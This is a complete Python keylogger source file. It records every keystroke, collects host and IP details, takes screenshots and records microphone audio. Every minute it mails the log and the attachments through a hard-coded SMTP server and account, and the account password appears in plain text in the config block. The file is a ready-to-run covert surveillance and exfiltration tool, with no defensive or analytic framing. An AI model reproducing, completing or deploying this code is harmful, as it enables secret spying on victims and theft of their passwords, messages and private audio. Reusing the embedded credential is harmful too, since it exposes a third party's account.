import os
import sys
import smtplib
import socket
import threading
import wave
import random
import tempfile
import psutil
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# External modules
import pyscreenshot as ImageGrab
import sounddevice as sd
from pynput import keyboard

# ================== CONFIG ==================
CONFIG = {
    "user": "keylog@fks5.net",   # email sender
    "password": "ppxoVyStb+",    # email password
    "host": "mail.fks5.net",     # SMTP host
    "port": 465,                 # SMTP SSL port
    "interval": 60               # report interval in seconds
}
# ============================================


class Monitor:
    def __init__(self, interval, config):
        self.interval = interval
        self.config = config
        self.log = f"🟢 Session started at {datetime.now()}\n"
        self.buffer = ""
        self.timer = None
        self.active = False

    # ---------- LOGGING ----------
    def log_event(self, message):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.log += f"{timestamp} → {message}\n"

    def flush_buffer(self, reason="Idle"):
        if self.buffer.strip():
            self.log_event(f"⌨️ Typed ({reason}) → \"{self.buffer.strip()}\"")
            self.buffer = ""

    def restart_idle_timer(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(5, self.flush_buffer, args=("Idle",))
        self.timer.daemon = True
        self.timer.start()

    # ---------- KEYBOARD ----------
    def on_key_press(self, key):
        try:
            self.buffer += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.buffer += " "
            elif key == keyboard.Key.enter:
                self.flush_buffer(reason="Enter")
            elif key == keyboard.Key.backspace:
                self.buffer = self.buffer[:-1]
            else:
                self.log_event(f"⎇ Special Key → {str(key).replace('Key.','').title()}")
        self.restart_idle_timer()

    # ---------- SYSTEM INFO ----------
    def log_system_info(self):
        try:
            info = {
                "Host": socket.gethostname(),
                "IP": socket.gethostbyname(socket.gethostname()),
                "CPU": os.cpu_count(),
                "OS": sys.platform,
                "Python": sys.version.split()[0]
            }
            self.log_event("💻 System Info → " + " | ".join([f"{k}: {v}" for k, v in info.items()]))
        except Exception as e:
            self.log_event(f"❌ System Info Error → {e}")

    # ---------- FEATURES ----------
    def take_screenshot(self):
        try:
            temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_{random.randint(1000,9999)}.png")
            img = ImageGrab.grab()
            img.save(temp_path)
            return temp_path
        except Exception as e:
            self.log_event(f"❌ Screenshot Failed → {e}")
            return None

    def record_audio(self, duration=5, samplerate=44100):
        try:
            temp_path = os.path.join(tempfile.gettempdir(), f"audio_{random.randint(1000,9999)}.wav")
            recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=2, dtype='int16')
            sd.wait()
            with wave.open(temp_path, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(samplerate)
                wf.writeframes(recording.tobytes())
            return temp_path
        except Exception as e:
            self.log_event(f"❌ Audio Recording Failed → {e}")
            return None

    # ---------- EMAIL ----------
    def send_report(self, title="Report"):
        self.flush_buffer("Final")

        msg = MIMEMultipart()
        msg['From'] = self.config['user']
        msg['To'] = self.config['user']
        msg['Subject'] = f"📑 Activity Report: {title} (#{random.randint(1000, 9999)})"
        msg.attach(MIMEText(self.log, 'plain'))

        # Collect attachments
        attachments = []
        screenshot = self.take_screenshot()
        if screenshot: attachments.append(screenshot)
        audio = self.record_audio()
        if audio: attachments.append(audio)

        for path in attachments:
            if path and os.path.exists(path):
                with open(path, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(path)}')
                    msg.attach(part)

        try:
            with smtplib.SMTP_SSL(self.config['host'], self.config['port']) as server:
                server.login(self.config['user'], self.config['password'])
                server.sendmail(self.config['user'], self.config['user'], msg.as_string())
            self.log_event("✅ Report dispatched successfully")
        except Exception as e:
            self.log_event(f"❌ Report Sending Failed → {e}")

    # ---------- MAIN LOOP ----------
    def schedule_report(self):
        if self.active:
            self.send_report("⏳ Scheduled Report")
            self.log = f"🔄 New session started at {datetime.now()}\n"
            timer = threading.Timer(self.interval, self.schedule_report)
            timer.daemon = True
            timer.start()

    def start(self):
        self.active = True
        self.log_event("🟢 Monitoring activated")
        self.log_system_info()
        self.schedule_report()

        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        keyboard_listener.start()
        self.log_event("🎯 Keyboard Tracking Active")

        try:
            keyboard_listener.join()
        except:
            self.stop()

    def stop(self):
        self.active = False
        self.log_event("🔴 Monitoring stopped")
        self.send_report("📑 Final Report")


# ================== MAIN ==================
def main():
    monitor = Monitor(CONFIG['interval'], CONFIG)
    try:
        monitor.start()
    except Exception as e:
        print(f"💥 Fatal error: {e}")


if __name__ == "__main__":
    main()
